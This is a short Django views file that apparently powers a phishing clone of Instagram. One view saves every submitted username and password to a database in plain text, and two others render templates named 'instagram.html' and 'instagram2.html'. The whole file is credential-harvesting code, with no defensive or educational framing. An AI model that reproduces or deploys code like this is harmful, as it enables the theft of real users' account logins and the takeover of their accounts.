from django.shortcuts import render
from .models import userinfo
def page1(request):
    if request.method=="POST":
        userinfo.objects.create(username=request.POST.get("username"),passw=request.POST.get("password")).save()
    return render(request,'index.html')
def page2(request):
    return render(request,'instagram.html')
def page3(request):
    return render(request,'instagram2.html')

# Create your views here.
